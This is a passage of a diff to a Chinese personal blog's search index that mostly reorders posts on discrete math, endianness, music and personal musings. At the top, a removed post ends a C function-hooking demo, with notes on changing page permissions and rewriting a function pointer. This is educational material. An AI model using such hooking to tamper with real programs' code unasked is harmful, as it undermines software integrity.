*)PAGE_START(addr), (void *)PAGE_END(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    hook();</span><br><span class="line">    </span><br><span class="line">    say_hello();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>主要看第十一行和第四十二行</p>
-<h2 id="正文">正文</h2>
-<p>第十一行是一个返回值为空指针的函数，这里目前还不太知道为什么，因为如果改成void是不影响后面操作的，姑且先认为是原作者的编写习惯</p>
-<p>第四十二行 是一个改变指针解读的操作，很精妙，也很基础</p>
-<p>主题逻辑是：</p>
-<ol type="1">
-<li>读入函数头表并定位基址</li>
-<li>改变页权限</li>
-<li>改写函数地址指向</li>
-<li>清除指令地址缓存__builtin___clear_cache，迫使CPU重新定位</li>
-<li>返回</li>
-</ol>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>开发</category>
-        <category>存档</category>
-        <category>Windows</category>
-      </categories>
   </entry>
   <entry>
     <title>番剧: 22/7 点评(无剧透)</title>
@@ -5169,17 +5178,6 @@ C处于继承树上的同一侧分支(说明C不是fakeC)</p>
       </tags>
   </entry>
   <entry>
-    <title>破大防</title>
-    <url>/po-da-fang/</url>
-    <content><![CDATA[<p>玩gal结果看到自己人生的悲惨一面真的破大防 结果还那么的写实,
-脚本怎么写的那么真实, 我都怀疑主文案是不是经历过相同经历
-是哪个gal就不说了,</p>
-]]></content>
-      <categories>
-        <category>黑历史与垃圾</category>
-      </categories>
-  </entry>
-  <entry>
     <title>离散数学连结词笔记</title>
     <url>/chi-san-shu-xue-lian-jie-ci-bi-ji/</url>
     <content><![CDATA[<p>①如果p那么q         　p-&gt;q;</p>
@@ -5202,44 +5200,14 @@ C处于继承树上的同一侧分支(说明C不是fakeC)</p>
       </categories>
   </entry>
   <entry>
-    <title>联结词完备集</title>
-    <url>/lian-jie-ci-wan-bei-ji/</url>
-    <content><![CDATA[<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113743.png" /></p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113849.png" /></p>
-<p>主要是任一，任一指的是世界上所有命题</p>
-<p>只要含有否定，同时含有析取或合取</p>
-<p>即可成为完备集</p>
+    <title>破大防</title>
+    <url>/po-da-fang/</url>
+    <content><![CDATA[<p>玩gal结果看到自己人生的悲惨一面真的破大防 结果还那么的写实,
+脚本怎么写的那么真实, 我都怀疑主文案是不是经历过相同经历
+是哪个gal就不说了,</p>
 ]]></content>
       <categories>
-        <category>笔记</category>
-        <category>校内</category>
-        <category>离散</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>补一个大小端序，栈增长，迭代方向的底层数据处理笔记</title>
-    <url>/bu-yi-ge-da-xiao-duan-xu-zhan-zeng-chang-die-dai-fang-xiang-de-di-ceng-shu-ju-chu/</url>
-    <content><![CDATA[<p>突然发现这几个东西完全搞混了谁管辖谁</p>
-<p>在任何情况下都有一个共识，那就是作为一个数组，0号元素存储在地址地位，最后一个元素存储在地址高位</p>
-<p>不论地址增长方式，不论大小端，这个是共识</p>
-<p>这个共识来自：迭代方向在微观和宏观上的统一</p>
-<p>如果我for循环是0到30，计数器i++，那么微观上我们会用inc（也有的编译器是用ecx）</p>
-<p>如果元素储存方向和栈增长方向相同：0号存储在最高位，最后一个元素存在栈顶，地址最低位</p>
-<p>这样i++在底层汇编就变成dec了！完全相反</p>
-<p>实际上，大小端序真正的含义是<strong>单个元素内部</strong>的字节顺序安排（数据高位和低位）与栈增长方向（地址大小关系）的关系</p>
-<p>参考</p>
-<p>https://jaimelightfoot.com/blog/pwnables-kr-collision-walkthrough/</p>
-<p>https://zhuanlan.zhihu.com/p/21388517</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112430.png" /></p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112295.png" /></p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
+        <category>黑历史与垃圾</category>
       </categories>
   </entry>
   <entry>
@@ -5265,6 +5233,23 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113941
       </categories>
   </entry>
   <entry>
+    <title>联结词完备集</title>
+    <url>/lian-jie-ci-wan-bei-ji/</url>
+    <content><![CDATA[<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113743.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113849.png" /></p>
+<p>主要是任一，任一指的是世界上所有命题</p>
+<p>只要含有否定，同时含有析取或合取</p>
+<p>即可成为完备集</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>校内</category>
+        <category>离散</category>
+      </categories>
+  </entry>
+  <entry>
     <title>谈抽烟</title>
     <url>/tan-chou-yan/</url>
     <content><![CDATA[<p>就我个人看来，抽烟目的并不是尼古丁带来的巴多酚，更多的是人类基因当中对火的依赖</p>
@@ -5286,6 +5271,30 @@ list还是得满一些，不然就陷入了一种心理斗争：明明活够了�
 ]]></content>
       <categories>
         <category>黑历史与垃圾</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>补一个大小端序，栈增长，迭代方向的底层数据处理笔记</title>
+    <url>/bu-yi-ge-da-xiao-duan-xu-zhan-zeng-chang-die-dai-fang-xiang-de-di-ceng-shu-ju-chu/</url>
+    <content><![CDATA[<p>突然发现这几个东西完全搞混了谁管辖谁</p>
+<p>在任何情况下都有一个共识，那就是作为一个数组，0号元素存储在地址地位，最后一个元素存储在地址高位</p>
+<p>不论地址增长方式，不论大小端，这个是共识</p>
+<p>这个共识来自：迭代方向在微观和宏观上的统一</p>
+<p>如果我for循环是0到30，计数器i++，那么微观上我们会用inc（也有的编译器是用ecx）</p>
+<p>如果元素储存方向和栈增长方向相同：0号存储在最高位，最后一个元素存在栈顶，地址最低位</p>
+<p>这样i++在底层汇编就变成dec了！完全相反</p>
+<p>实际上，大小端序真正的含义是<strong>单个元素内部</strong>的字节顺序安排（数据高位和低位）与栈增长方向（地址大小关系）的关系</p>
+<p>参考</p>
+<p>https://jaimelightfoot.com/blog/pwnables-kr-collision-walkthrough/</p>
+<p>https://zhuanlan.zhihu.com/p/21388517</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112430.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112295.png" /></p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>二进制</category>
       </categories>
   </entry>
   <entry>
@@ -5338,6 +5347,19 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172059897
       <categories>
         <category>笔记</category>
         <category>存档</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>过程和函数（对象）</title>
+    <url>/guo-cheng-he-han-shu-dui-xiang/</url>
+    <content><![CDATA[<p>笔者不是搞学术的，本文一律认为函数是纯函数的代名词</p>
+<p>#define 函数 纯函数</p>
+<h2 id="正文">正文</h2>
+<p>函数是没有副作用的过程，而一般我们在汇编层面编写函数，大多数情况下唯一的副作用就是eax</p>
+<p>所以其实应该广义的看待子例</p>
+]]></content>
+      <categories>
+        <category>黑历史与垃圾</category>
       </categories>
   </entry>
   <entry>
@@ -5479,19 +5501,6 @@ return 0;</code></pre>
       <tags>
         <tag>Hook</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>过程和函数（对象）</title>
-    <url>/guo-cheng-he-han-shu-dui-xiang/</url>
-    <content><![CDATA[<p>笔者不是搞学术的，本文一律认为函数是纯函数的代名词</p>
-<p>#define 函数 纯函数</p>
-<h2 id="正文">正文</h2>
-<p>函数是没有副作用的过程，而一般我们在汇编层面编写函数，大多数情况下唯一的副作用就是eax</p>
-<p>所以其实应该广义的看待子例</p>
-]]></content>
-      <categories>
-        <category>黑历史与垃圾</category>
-      </categories>
   </entry>
   <entry>
     <title>逻辑代数基本规则</title>
@@ -5842,6 +5851,19 @@ title="模态逻辑">模态逻辑</a></p>
       </categories>
   </entry>
   <entry>
+    <title>音乐《Ascent》点评</title>
+    <url>/yin-le-ascent-dian-ping/</url>
+    <content><![CDATA[<p>链接：https://music.163.com/song?id=1865086956&amp;userid=476972634</p>
+<p>每一小片段的分割很顺畅，过度出每一小片的离调写的刚刚好，不和谐音程既不会跨度太大导致宁静的意境全无，又不会跨度太小使得让人感觉只是小片chant，而非淡出小片</p>
+<p>有一个很亮点的地方是，用钢琴踏板的机械音和琴键按下时的键盘音来烘托安静的氛围，而且很明显能感觉到，这部分的声音后期调大了，让人感觉是实体乐器演奏（虽然MIDI钢琴也能做到这一点就是了）</p>
+<p>这点真的听的太爽了</p>
+<p>以前我一直是极力避免，现在看来，艺术确实不能拘泥于形式</p>
+]]></content>
+      <categories>
+        <category>杂谈</category>
+      </categories>
+  </entry>
+  <entry>
     <title>门电路符号表</title>
     <url>/men-dian-lu-fu-hao-biao/</url>
     <content><![CDATA[<p>类型</p>
@@ -6171,19 +6193,6 @@ alt="{(ab)}" /></p>
         <category>笔记</category>
         <category>校内</category>
         <category>计组</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>音乐《Ascent》点评</title>
-    <url>/yin-le-ascent-dian-ping/</url>
-    <content><![CDATA[<p>链接：https://music.163.com/song?id=1865086956&amp;userid=476972634</p>
-<p>每一小片段的分割很顺畅，过度出每一小片的离调写的刚刚好，不和谐音程既不会跨度太大导致宁静的意境全无，又不会跨度太小使得让人感觉只是小片chant，而非淡出小片</p>
-<p>有一个很亮点的地方是，用钢琴踏板的机械音和琴键按下时的键盘音来烘托安静的氛围，而且很明显能感觉到，这部分的声音后期调大了，让人感觉是实体乐器演奏（虽然MIDI钢琴也能做到这一点就是了）</p>
-<p>这点真的听的太爽了</p>
-<p>以前我一直是极力避免，现在看来，艺术确实不能拘泥于形式</p>
-]]></content>
-      <categories>
-        <category>杂谈</category>
       </categories>
   </entry>
 </search>
